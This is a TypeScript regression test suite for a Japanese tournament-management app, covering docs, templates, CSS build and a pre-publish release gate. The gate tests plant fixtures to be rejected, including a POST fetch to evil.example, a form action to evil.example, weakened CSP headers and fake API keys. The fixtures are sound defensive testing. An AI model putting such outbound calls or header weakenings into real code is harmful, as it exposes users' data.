// Round-1 polish regression checks for the "misc" area (CSS build, release gate, docs, tooling, templates).
// Each test names the finding id it guards. Everything here is local and uses fake data only.
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';
import { unzipSync, strFromU8 } from 'fflate';
import postcss from 'postcss';
import { DEFAULT_CLASS_SETTINGS } from '../core/classRules.ts';
import postcssConfig from '../postcss.config.mjs';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const read = (path: string) => readFileSync(join(ROOT, path), 'utf8');
const DOC_CLASS = 'docs/クラス区分_設定の入れ方.md';
const DOC_PUBLISH = 'docs/TOURNAMENT_OS_公開とCodex連携の決まり.md';

/* ───────── r1-39 / r1-71 / r1-85 / r1-155: 「はじめから入っている文」の表は、本物の初期値と同じ ───────── */

/** Markdown の表（「項目 | 入れる文」）を、{項目: 文} にする */
function docDefaults(): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of read(DOC_CLASS).split('\n')) {
    const m = line.match(/^\|\s*([^|]+?)\s*\|\s*(.+?)\s*\|\s*$/);
    if (m && m[1] !== '項目' && !/^-+$/.test(m[1])) out[m[1]] = m[2];
  }
  return out;
}
/** .gs の SETTING_ROWS から、「項目 → 初期値」を取り出す */
function gsDefaults(): Record<string, string> {
  const gs = read('public/templates/Tournament_OS_Google受付_v3.gs');
  const block = gs.slice(gs.indexOf('const SETTING_ROWS = ['), gs.indexOf('];', gs.indexOf('const SETTING_ROWS = [')));
  const out: Record<string, string> = {};
  for (const m of block.matchAll(/^\s*\['([^']*)',\s*'([^']*)',/gm)) out[m[1]] = m[2];
  return out;
}

test('r1-39/71/85/155: docs の表の「入れる文」は、DEFAULT_CLASS_SETTINGS と同じ', () => {
  const d = docDefaults();
  assert.equal(d['クラス分け'], 'あり');
  assert.equal(d['上のクラスの名前'], DEFAULT_CLASS_SETTINGS.upper.name);
  assert.equal(d['上のクラスの条件'], DEFAULT_CLASS_SETTINGS.upper.condition);
  assert.equal(d['上のクラスのルール'], DEFAULT_CLASS_SETTINGS.upper.rule);
  assert.equal(d['下のクラスの名前'], DEFAULT_CLASS_SETTINGS.lower.name);
  assert.equal(d['下のクラスの条件'], DEFAULT_CLASS_SETTINGS.lower.condition);
  assert.equal(d['下のクラスのルール'], DEFAULT_CLASS_SETTINGS.lower.rule);
  assert.equal(d['上のクラスにする勝ち数'], String(DEFAULT_CLASS_SETTINGS.upperMinWins));
});

test('r1-39/71/85/155: docs の表の文は、シート（.gs の SETTING_ROWS）の初期値とも同じ（「あり」だけは、手で変える項目）', () => {
  const d = docDefaults();
  const g = gsDefaults();
  for (const key of ['上のクラスの名前', '上のクラスの条件', '上のクラスのルール', '下のクラスの名前', '下のクラスの条件', '下のクラスのルール', '上のクラスにする勝ち数']) {
    assert.ok(g[key], '.gs に ' + key + ' の行がある');
    assert.equal(d[key], g[key], key + ': docs の表と .gs の初期値が同じ');
  }
  assert.equal(g['クラス分け'], 'なし', '.gs の初期値は「なし」（手順3で「あり」にする）');
});

test('r1-85: 手順3は「B13のマス（A13に「クラス分け」と書いてある行）」と、はっきり言う', () => {
  const doc = read(DOC_CLASS);
  assert.match(doc, /A13に「クラス分け」と書いてある行/);
  assert.match(doc, /B13のマス/);
  assert.doesNotMatch(doc, /（B13）の右どなり/);
  // 本当に、13行目が「クラス分け」か（項目は2行目から並ぶので、13行目は12番目）
  const rows = [...read('public/templates/Tournament_OS_Google受付_v3.gs').matchAll(/^\s*\['([^']*)',\s*'[^']*',/gm)].map((m) => m[1]);
  assert.equal(rows[11], 'クラス分け', 'SETTING_ROWS の12番目（シートの13行目）は「クラス分け」');
});

/* ───────── r1-161: ひな形シートを新しくする手順 ───────── */

test('r1-161: ひな形シートの入れかえ手順がある（貼る・①・build の確認・リンクの控え・公開の見くらべ）', () => {
  const doc = read(DOC_CLASS);
  assert.match(doc, /## ひな形シートを新しくする/);
  const build = read('public/templates/Tournament_OS_Google受付_v3.gs').match(/RECEPTION_BUILD = '([0-9.]+)'/)![1];
  assert.match(doc, new RegExp(build.replace(/\./g, '\\.')), 'docs に今の build 番号がある');
  for (const word of ['appsscript.json', '① 最初の設定', 'template-link.backup.json', 'npm run deploy:private', 'テスト用のアカウント']) assert.ok(doc.includes(word), word);
  assert.match(read('scripts/deploy-private.sh'), /RECEPTION_BUILD/, 'deploy は公開する .gs の build を画面に出す');
});

/* ───────── r1-39: Excel のひな形にも「クラス」の列がある ───────── */

test('r1-39: 選手入力テンプレートに「クラス」の列(K)と、Aクラス/Bクラスの選択肢がある。古い10列はそのまま', () => {
  const files = unzipSync(new Uint8Array(readFileSync(join(ROOT, 'public/templates/Tournament_OS_選手入力テンプレート.xlsx'))));
  const sheet = strFromU8(files['xl/worksheets/sheet2.xml']);
  assert.match(sheet, /<x:c r="K1"[^>]*><x:v>クラス<\/x:v>/);
  assert.equal((sheet.match(/<x:c r="K\d+"/g) ?? []).length, 101, 'K1〜K101');
  assert.match(sheet, /sqref="K2:K101"><x:formula1>"Aクラス,Bクラス"<\/x:formula1>/);
  assert.match(sheet, /errorStyle="warning"/, '名前を変えた大会でも入力できる（止めない）');
  assert.match(sheet, /<x:dataValidations count="4">/);
  // いままでの10列(A〜J)の見出しは、順番も変わらない
  const heads = [...sheet.matchAll(/<x:c r="([A-J])1"[^>]*><x:v>([^<]+)<\/x:v>/g)].map((m) => m[2]);
  assert.deepEqual(heads, ['管理番号', 'ジム名', '選手名', '学年', '年齢', '身長', '体重', '戦績・競技歴', '試合への意気込み', '入場曲URL（Apple Music推奨）']);
  assert.match(strFromU8(files['xl/worksheets/sheet2.xml']), /<x:col min="11" max="11"/);
});

/* ───────── r1-128: ビルドした CSS に @layer が残らない（Safari 15.0〜15.3） ───────── */

type Plugin = { postcssPlugin: string };
const flatten = (): Plugin => (postcssConfig.plugins as Array<[unknown, unknown]>).map((p) => p[0]).filter((p): p is () => Plugin => typeof p === 'function')[0]();
const runFlatten = async (css: string) => (await postcss([flatten() as never]).process(css, { from: undefined })).css;

test('r1-128: postcss.config.mjs は Tailwind のあとに @layer を取りのぞく部品を入れている', () => {
  const plugins = postcssConfig.plugins as Array<[unknown, unknown]>;
  assert.equal(plugins[0][0], '@tailwindcss/postcss');
  assert.equal(typeof plugins[1][0], 'function');
  assert.equal(flatten().postcssPlugin, 'tos-flatten-layers');
});

test('r1-128: @layer は無くなり、中の規則は同じ順番で残る。順番だけの行は消える', async () => {
  const out = await runFlatten('@layer theme, base, utilities;@layer base{a{color:red}}@layer utilities{.b{margin:0}@layer inner{.c{top:0}}}.tos-x{color:blue}');
  assert.ok(!/@layer/.test(out), out);
  assert.ok(out.indexOf('a{') < out.indexOf('.b{') && out.indexOf('.b{') < out.indexOf('.c{'), '順番が同じ: ' + out);
});

test('r1-128: 手書きの規則(@layer の外)だけに、ID1つ分の強さ :not(#\\#) が付き、@layer の中には付かない', async () => {
  const out = await runFlatten('@layer utilities{.u:hover,.v[aria-disabled=true]{color:red}}.tos-locked,.tos-main.tos-locked:hover{color:blue}');
  assert.match(out, /\.tos-locked:not\(#\\#\),\.tos-main\.tos-locked:hover:not\(#\\#\)\{/);
  assert.ok(!/\.u:hover:not|\.v\[aria-disabled=true\]:not/.test(out), '@layer の中の規則には付けない: ' + out);
});

test('r1-128: 疑似要素は :not(#\\#) のうしろ。@media/@supports の中の手書きの規則にも付く。keyframes には付けない', async () => {
  const out = await runFlatten('.a::before,.b:after{x:1}@media (min-width:1px){.c{x:1}}@supports not selector(:focus-visible){.d:focus{x:1}}@keyframes k{from{x:1}to{x:2}}:root{--a:1}html:has(.e){x:1}');
  assert.match(out, /\.a:not\(#\\#\)::before,\.b:not\(#\\#\):after\{/);
  assert.match(out, /@media \(min-width:1px\)\{\.c:not\(#\\#\)\{/);
  assert.match(out, /\.d:focus:not\(#\\#\)\{/);
  assert.match(out, /@keyframes k\{from\{x:1\}to\{x:2\}\}/);
  assert.match(out, /:root:not\(#\\#\)\{--a:1\}/);
  assert.match(out, /html:has\(\.e\):not\(#\\#\)\{/);
});

test('r1-128: Tailwind の変種(aria-disabled:…)より、手書きの .tos-locked が強いままになる（実際の強さを比べる）', async () => {
  // 以前（@layer あり）: 手書きは必ず勝つ。いま: ID1つ分強くして、同じ結果にする。
  const out = await runFlatten('@layer utilities{.aria-disabled\\:text-slate-700[aria-disabled="true"]{color:#334155}}.tos-locked{color:#374151}');
  assert.match(out, /\.tos-locked:not\(#\\#\)\{color:#374151\}/);
});

/* ───────── r1-132 / r1-133 / r1-142 / r1-172: 公開してよいかの自動チェック ───────── */

const GATE = join(ROOT, 'scripts/check-private-build.mjs');
const HEADERS = read('public/_headers');
function makeBuild(): string {
  const dir = mkdtempSync(join(tmpdir(), 'tos-gate-'));
  const put = (path: string, text: string) => { mkdirSync(dirname(join(dir, path)), { recursive: true }); writeFileSync(join(dir, path), text); };
  put('_headers', HEADERS);
  put('_redirects', '/  /private/  302\n');
  put('template-link.json', '{ "copyUrl": "" }');
  put('templates/Tournament_OS_Google受付_v3.gs', "const RECEPTION_BUILD = '1.0.0';");
  for (const page of ['private/index.html', 'private/setup/index.html', 'private/live/index.html', 'apply/index.html']) put(page, '<!doctype html><html><body><a href="https://docs.google.com/spreadsheets/">link</a></body></html>');
  put('_next/static/chunks/a.js', 'var a="invalid zip data";var b="sharedStrings";');
  put('_next/static/chunks/a.css', 'body{color:red}');
  return dir;
}
const gate = (dir: string) => spawnSync(process.execPath, [GATE, dir], { encoding: 'utf8' });
const put = (dir: string, path: string, text: string) => { mkdirSync(dirname(join(dir, path)), { recursive: true }); writeFileSync(join(dir, path), text); };
const edit = (dir: string, path: string, f: (text: string) => string) => writeFileSync(join(dir, path), f(readFileSync(join(dir, path), 'utf8')));

test('r1-132/133/142/172: ふつうの公開用フォルダは通る（本物の _headers で）', () => {
  const dir = makeBuild();
  try { const r = gate(dir); assert.equal(r.status, 0, r.stdout + r.stderr); assert.match(r.stdout, /^OK 公開用フォルダは、正常です/); } finally { rmSync(dir, { recursive: true, force: true }); }
});

const BAD: Array<[string, (dir: string) => void, RegExp]> = [
  ['名簿のCSV', (d) => put(d, 'private/players.csv', '選手名,電話番号\n架空,09012345678'), /csv/],
  ['バックアップ(.enc)', (d) => put(d, 'private/backup.enc', 'x'), /enc/],
  ['ソースマップ', (d) => put(d, '_next/static/chunks/x.js.map', '{}'), /map/],
  ['.env', (d) => put(d, '.env', 'A=1'), /置いてはいけない/],
  ['隠しファイル', (d) => put(d, 'private/.secret', 'x'), /隠しファイル/],
  ['写真(jpg)', (d) => put(d, 'photos/F01.jpg', 'x'), /置いてはいけない/],
  ['ZIP', (d) => put(d, 'apply/roster.zip', 'x'), /zip/],
  ['_headers が空', (d) => put(d, '_headers', 'x'), /_headers/],
  ['/apply/* の設定が無い', (d) => edit(d, '_headers', (t) => t.replace(/\/apply\/\*[\s\S]*?(?=\n\/|$)/, '')), /\/apply\/\*/],
  ['/apply/* の connect-src が *', (d) => edit(d, '_headers', (t) => t.replace(/(\/apply\/\*[\s\S]*?)connect-src 'none'/, '$1connect-src *')), /connect-src/],
  ['/apply/* の form-action が外', (d) => edit(d, '_headers', (t) => t.replace(/(\/apply\/\*[\s\S]*?)form-action https:\/\/script\.google\.com https:\/\/script\.googleusercontent\.com/, '$1form-action https://evil.example')), /form-action|evil/],
  ['script-src に外の宛先', (d) => edit(d, '_headers', (t) => t.replace("script-src 'self'", "script-src 'self' https://cdn.example.net")), /cdn\.example\.net/],
  ['Referrer-Policy が違う', (d) => edit(d, '_headers', (t) => t.replace('Referrer-Policy: no-referrer', 'Referrer-Policy: origin')), /Referrer-Policy/],
  ['X-Robots-Tag が無い', (d) => edit(d, '_headers', (t) => t.replaceAll('  X-Robots-Tag: noindex, nofollow\n', '')), /X-Robots-Tag/],
  ['frame-ancestors が違う', (d) => edit(d, '_headers', (t) => t.replace("frame-ancestors 'none'", "frame-ancestors *")), /frame-ancestors/],
  ['外のスクリプト', (d) => put(d, 'apply/index.html', '<html><script src="https://cdn.example.com/x.js"></script></html>'), /外のファイル/],
  ['外のCSS(link)', (d) => put(d, 'apply/index.html', '<html><link rel="stylesheet" href="//fonts.example.com/a.css"></html>'), /外のファイル/],
  ['外の画像', (d) => put(d, 'private/index.html', '<html><img src="https://img.example.com/a.png"></html>'), /外のファイル/],
  ['外のフォームの送り先', (d) => put(d, 'apply/index.html', '<html><form action="https://evil.example/x"></form></html>'), /フォーム/],
  ['CSSの外部フォント', (d) => put(d, '_next/static/chunks/a.css', '@font-face{src:url(https://fonts.example.com/a.woff2)}'), /外のファイル/],
  ['CSSの @layer', (d) => put(d, '_next/static/chunks/a.css', '@layer base{a{color:red}}'), /@layer/],
  ['JSの fetch(外)', (d) => put(d, '_next/static/chunks/b.js', 'fetch("https://evil.example/x",{method:"POST"})'), /外へ通信/],
  ['template-link.json の形', (d) => put(d, 'template-link.json', '{ "copyUrl": "https://example.com/copy" }'), /template-link/],
  ['鍵 AKIA', (d) => put(d, '_next/static/chunks/b.js', 'var k="AKIAIOSFODNN7EXAMPLE";'), /AWS/],
  ['鍵 ghp_', (d) => put(d, '_next/static/chunks/b.js', 'var k="ghp_' + 'a'.repeat(36) + '";'), /GitHub/],
  ['鍵 AIza', (d) => put(d, '_next/static/chunks/b.js', 'var k="AIza' + 'a'.repeat(35) + '";'), /Google API/],
  ['鍵 xoxb', (d) => put(d, '_next/static/chunks/b.js', 'var k="xoxb-1234567890-abcdef";'), /Slack/],
  ['JWT', (d) => put(d, '_next/static/chunks/b.js', 'var k="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc";'), /JWT/],
  ['sk-proj', (d) => put(d, '_next/static/chunks/b.js', 'var k="sk-proj-' + 'a'.repeat(30) + '";'), /API/],
  ['operatorKey = 文字', (d) => put(d, '_next/static/chunks/b.js', 'var o={operatorKey:"abcdef0123456789abcdef"};'), /合言葉/],
  ['本物らしい電話番号', (d) => put(d, 'private/index.html', '<html>連絡は 090-1234-9876 へ</html>'), /電話番号/],
  ['本物らしいメール', (d) => put(d, 'private/index.html', '<html>yamada.taro@gmail.com</html>'), /メール/],
];
for (const [name, mutate, expected] of BAD) {
  test('r1-132/133/142/172: 公開用フォルダに「' + name + '」があると止まる', () => {
    const dir = makeBuild();
    try { mutate(dir); const r = gate(dir); assert.equal(r.status, 1, r.stdout + r.stderr); assert.match(r.stderr, expected); } finally { rmSync(dir, { recursive: true, force: true }); }
  });
}

test('r1-142: 見本のメール・電話(example.com / 090-1234-5678 の形の見本)は、止めない', () => {
  const dir = makeBuild();
  try {
    put(dir, 'private/index.html', '<html>name@example.com 09012345678 gym@example.invalid</html>');
    const r = gate(dir); assert.equal(r.status, 0, r.stdout + r.stderr);
  } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r1-132: 本物の template-link.json の形(docs.google.com/.../copy)は通る', () => {
  const dir = makeBuild();
  try { put(dir, 'template-link.json', '{ "copyUrl": "https://docs.google.com/spreadsheets/d/AbC_123-xyz/copy" }'); const r = gate(dir); assert.equal(r.status, 0, r.stdout + r.stderr); } finally { rmSync(dir, { recursive: true, force: true }); }
});

test('r1-132: build-private-pages.sh は、作業場所で組み立てて、公開用フォルダを丸ごと入れかえる(古いファイルが残らない)', () => {
  const sh = read('scripts/build-private-pages.sh');
  assert.match(sh, /STAGE="\$\(mktemp -d\)"/);
  assert.match(sh, /rsync -a --delete "\$STAGE\/" "\$TARGET_DIR\/"/);
  assert.ok(sh.indexOf('rsync -a --delete "$STAGE/"') < sh.indexOf('check-private-build.mjs'), '入れかえてから、チェックする');
});

/* ───────── r1-158 / r1-43 / r1-113 / r1-156 / r1-74 / r1-105: ぜんぶ動かす1つのコマンドと、一覧 ───────── */

const suites = readdirSync(join(ROOT, 'scripts')).filter((f) => /^test-.*\.mjs$/.test(f)).sort();

test('r1-158: verify-private-all.sh と npm run verify:all がある。tsc・npm test・build:private・サーバー・全 test-*.mjs・validate-ai-os・git の見張りを動かす', () => {
  const sh = read('scripts/verify-private-all.sh');
  assert.match(sh, /set -euo pipefail/);
  for (const part of ['npx tsc --noEmit', 'npm test', 'build:private', 'python3 -m http.server', 'scripts/test-*.mjs', 'validate-ai-os', 'git_watch', '--fast', 'TOS_ONLY', 'TOS_CHROME_PATH', 'trap ']) assert.ok(sh.includes(part), part);
  assert.match(sh, /\.verify-ok/, '全部合格したときだけ指紋を書く');
  const pkg = JSON.parse(read('package.json'));
  assert.equal(pkg.scripts['verify:all'], 'bash scripts/verify-private-all.sh');
  assert.ok(existsSync(join(ROOT, 'scripts/tree-stamp.sh')));
});

test('r1-158: verify-private-all.sh を --fast にすると、mistake-proof だけをとばす（--help も動く）', () => {
  const r = spawnSync('bash', [join(ROOT, 'scripts/verify-private-all.sh'), '--help'], { encoding: 'utf8' });
  assert.equal(r.status, 0);
  assert.match(r.stdout, /--fast/);
  const bad = spawnSync('bash', [join(ROOT, 'scripts/verify-private-all.sh'), '--nope'], { encoding: 'utf8' });
  assert.equal(bad.status, 2);
  assert.match(bad.stdout, /知らない指定/);
});

test('r1-172: deploy-private.sh は検証ずみの指紋を見くらべ、ちがうときは yes-unverified を打たせる', () => {
  const sh = read('scripts/deploy-private.sh');
  assert.match(sh, /tree-stamp\.sh/);
  assert.match(sh, /\.verify-ok/);
  assert.match(sh, /yes-unverified/);
});

test('r1-172: tree-stamp.sh は「コミット:指紋」を1行で出す', () => {
  const r = spawnSync('bash', [join(ROOT, 'scripts/tree-stamp.sh')], { encoding: 'utf8' });
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout.trim(), /^(?:[0-9a-f]{40}|none):[0-9a-f]{40}$/, 'git の外(フォルダだけ取り出した場合)は none: から始まる');
});

test('r1-74/105/113/156/163: 公開の決まりの文書は、scripts/test-*.mjs の全部の名前を並べている', () => {
  const doc = read(DOC_PUBLISH);
  const missing = suites.filter((s) => !doc.includes('scripts/' + s));
  assert.deepEqual(missing, [], '文書に無い画面の確認: ' + missing.join(', '));
  assert.doesNotMatch(doc, /画面の確認6本/);
  assert.match(doc, /verify-private-all\.sh/);
  assert.match(doc, /npm run verify:all/);
  assert.match(doc, /validate-ai-os/);
});

test('r1-74/105/113/156: README と START_HERE は verify:all を案内し、テスト数の古い数字を「今の数」と言わない', () => {
  const readme = read('README.md');
  assert.match(readme, /verify-private-all\.sh|verify:all/);
  assert.doesNotMatch(readme, /テスト63件/);
  assert.match(read('START_HERE.md'), /verify:all|verify-private-all/);
});

test('r1-166/r1-74: .gitignore は、手元の作業フォルダ(next-stale-cache*)・検証の指紋を無視し、追跡している public/_headers は無視しない', () => {
  const inner = read('.gitignore');
  assert.match(inner, /^next-stale-cache\*\/$/m);
  assert.match(inner, /^\.verify-ok$/m);
  assert.doesNotMatch(inner, /^public\/_headers$/m);
  assert.match(inner, /^\/AGENTS\.md$/m);
  // リポジトリの一番上の .gitignore（フォルダだけ取り出したときは、ここに無いので、この1行は省く）
  if (existsSync(join(ROOT, '..', '.gitignore'))) assert.match(readFileSync(join(ROOT, '..', '.gitignore'), 'utf8'), /^next-stale-cache\*\/$/m);
});

test('r1-171: package.json に壊れた lint(next lint は Next 16 で無い)が無い。typecheck は残っている', () => {
  const pkg = JSON.parse(read('package.json'));
  assert.equal(pkg.scripts.lint, undefined);
  assert.equal(pkg.scripts.typecheck, 'tsc --noEmit');
});

/* ───────── r1-106 / r1-137 / r1-164: テストの質 ───────── */

test('r1-106/137: 黄色の「次はここ」の確かめは、「多くても1つ」にゆるめていない', () => {
  for (const file of suites) {
    const text = read('scripts/' + file);
    assert.doesNotMatch(text, /markers: 'max1'|markers:'max1'/, file + ': max1');
    assert.doesNotMatch(text, /markers: m\.length|markers: \(await markerOf\(\w+\)\)\.length/, file + ': 数えた数を、そのまま期待値にしている');
    assert.doesNotMatch(text, /primary\.length <= 1/, file + ': 主ボタンが1つ以下');
  }
});

test('r1-165: どの画面の確認も TOS_CHROME_PATH を読む。機械ごとの道すじ(/tmp/claude-0・/opt/pw-browsers)を書かない', () => {
  for (const file of suites) {
    const text = read('scripts/' + file);
    assert.match(text, /TOS_CHROME_PATH/, file);
    assert.doesNotMatch(text, /claude-0|\/opt\/pw-browsers/, file + ': 機械ごとの道すじ');
    assert.doesNotMatch(text, /path:\s*'\/tmp\/tournament-os-/, file + ': 画像を決まった /tmp に書く');
  }
});

test('r1-164/B13: scripts/test-polish-misc.mjs は存在し、非ゼロの終了コードを返す作りになっている', () => {
  const text = read('scripts/test-polish-misc.mjs');
  assert.match(text, /process\.exit\(\s*failures\.length\s*\?\s*1\s*:\s*0\s*\)/);
  assert.match(text, /TOS_TEST_BASE/);
});

/* ───────── r1-35 / r1-140: 明るい最初の画面・noscript・検索に出さない・アイコン ───────── */

test('r1-35: layout.tsx に noscript(黄色の ⚠ と理由)があり、/apply と /private は読み込み前から明るい色にする', () => {
  const layout = read('app/layout.tsx');
  assert.match(layout, /<noscript>/);
  assert.match(layout, /JavaScript/);
  assert.match(layout, /data-theme','light'/);
  assert.match(read('app/lib/NoScriptLight.tsx'), /background-color:#eef2f8!important/);
  assert.match(read('app/apply/layout.tsx'), /NoScriptLight/);
  assert.match(read('app/private/layout.tsx'), /NoScriptLight/);
});

test('r1-140: robots(noindex)・空のアイコン・全ブロックの X-Robots-Tag', () => {
  const layout = read('app/layout.tsx');
  assert.match(layout, /robots: \{ index: false, follow: false \}/);
  assert.match(layout, /icons: \{ icon: 'data:,' \}/);
  const blocks = HEADERS.split(/\n(?=\/)/).filter((b) => b.trim());
  assert.ok(blocks.length >= 6);
  for (const b of blocks) assert.match(b, /X-Robots-Tag: noindex, nofollow/, b.split('\n')[0]);
});

/* ───────── r1-167 / r1-168: 古い数字・状態の文書 ───────── */

test('r1-168: 要件の文書は「実装中」のままではなく、いまの状態(作成ずみ・実機の確認はまだ)を言う', () => {
  const doc = read('docs/次回大会_クラス区分_要件.md');
  assert.doesNotMatch(doc.split('\n').slice(0, 5).join('\n'), /実装中/);
  assert.match(doc.split('\n').slice(0, 5).join('\n'), /作成ずみ|作成済み/);
});

test('r1-168: 到達度の文書に「いまの数(日付つき)」がある。昔の数は「その日の値」と書いてある', () => {
  const doc = read('docs/TOURNAMENT_OS_V3_指示書と到達度.md');
  assert.match(doc, /いまの数（2026-10-12/);
  assert.match(doc, /3\.20261010\.5/);
});

test('r1-167: COORDINATION.md に、Tournament OS v3 の行とロックがある', { skip: !existsSync(join(ROOT, '..', 'COORDINATION.md')) && 'フォルダだけ取り出した場合は COORDINATION.md が無い' }, () => {
  const text = readFileSync(join(ROOT, '..', 'COORDINATION.md'), 'utf8');
  assert.match(text, /claude\/tournament-os-class-ab/);
  assert.match(text, /2026-10-12/);
});

/* ───────── B9: appsscript.json は、使う権限を宣言する（許可の画面を1回にする） ───────── */

test('B9: appsscript.json の oauthScopes は、.gs が使うサービスをおおう', () => {
  const manifest = JSON.parse(read('public/templates/appsscript.json'));
  const gs = read('public/templates/Tournament_OS_Google受付_v3.gs');
  const scopes: string[] = manifest.oauthScopes;
  assert.ok(Array.isArray(scopes) && scopes.length >= 4);
  const need: Array<[RegExp, string]> = [
    [/SpreadsheetApp|getActiveSpreadsheet/, 'https://www.googleapis.com/auth/spreadsheets'],
    [/DriveApp|getParents|moveTo/, 'https://www.googleapis.com/auth/drive'],
    [/SpreadsheetApp\.getUi|\.createMenu\(|getUi\(\)/, 'https://www.googleapis.com/auth/script.container.ui'],
    [/ScriptApp\./, 'https://www.googleapis.com/auth/script.scriptapp'],
    [/Session\.get(Active|Effective)User/, 'https://www.googleapis.com/auth/userinfo.email'],
  ];
  for (const [uses, scope] of need) if (uses.test(gs)) assert.ok(scopes.includes(scope), '.gs が使うのに宣言が無い: ' + scope);
  assert.ok(!/UrlFetchApp/.test(gs) || scopes.includes('https://www.googleapis.com/auth/script.external_request'), '外へ通信するなら、その権限も宣言する');
  assert.equal(manifest.webapp.executeAs, 'USER_DEPLOYING');
});
